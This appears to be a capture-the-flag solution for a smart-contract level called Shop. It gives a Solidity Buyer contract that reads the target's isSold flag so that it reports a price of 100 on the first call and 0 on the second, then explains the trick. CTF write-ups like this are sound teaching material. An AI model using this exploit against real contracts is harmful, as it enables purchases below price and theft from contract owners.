```javascript
pragma solidity ^0.6.0;

abstract contract Shop {
    int public price = 100;
    bool public isSold;
    function buy() public virtual;
}

contract Buyer {
  	function price() external view returns (uint) {
	    bool is_sold = Shop(msg.sender).isSold(); 
	    if (is_sold) {
	    	return 0;
	    } else {
	    	return 100;
	    }
  	}

  	function attack(address addr) public {
    	Shop(addr).buy();
  	}
}
```

Using the `isSold` variable, we can determine if it is the first call to `price` or the second call to `price`, and adjust the returned price accordingly.
